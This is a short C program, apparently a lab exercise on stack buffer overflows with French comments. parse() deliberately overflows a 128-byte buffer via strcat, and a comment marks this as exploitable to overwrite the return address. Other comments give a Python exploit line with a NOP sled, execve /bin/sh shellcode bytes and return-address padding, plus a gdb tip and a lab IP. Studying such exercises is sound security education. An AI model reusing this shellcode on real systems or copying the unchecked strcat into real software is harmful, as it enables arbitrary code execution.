#include <stdio.h>
#include <string.h>

/*Memoire Stack (comme la video computerphile)
|--------------------------------------|----------------|--------|-----|           |-------------|
    Buffer                             Greeting_text    RBP      return_address  prameters/variable   Function
|                  256                 |     128        |     8  |  6  |             |
*/

//Ip for Hugo http://192.168.185.129/

//(python - c 'print "\x90"*40 + "\0x48\0x31\0xd2\0x48\0xbb\0x2f\0x2f\0x62\0x69\0x6e\0x2f\0x73\0x68\0x48\0xc1\0xeb\0x08\0x53\0x48\0x89\0xe7\0x50\0x57\0x48\0x89\0xe6\0xb0\0x3b\0x0f\0x05" + "\x90"*24 + "\xac\xda\xff\xff\xff\x7f"*6')
//to see the registers x/200xw $sp-500 in gdb

//Shell Code: // \0x48\0x31\0xd2\0x48\0xbb\0x2f\0x2f\0x62\0x69\0x6e\0x2f\0x73\0x68\0x48\0xc1\0xeb\0x08\0x53\0x48\0x89\0xe7\0x50\0x57\0x48\0x89\0xe6\0xb0\0x3b\0x0f\0x05


int parse()
{
  char greeting_text[128];
  char buf[256] = {0};
  // Redirect stdout and stdin to the socket
  printf("What is your name?\n");
  fflush(stdout);
  fgets(buf, sizeof(buf), stdin);
  strcpy(greeting_text, "Hello, dear ");//12 -> 116 bytes à être remplis
  printf("%ld\n",buf-greeting_text);//Remains constant
  strcat(greeting_text, buf);//Exploitable here to reach the memory area of return pointer
  printf("%s\n", greeting_text);
  return 0;
}

int main() {
    parse();
}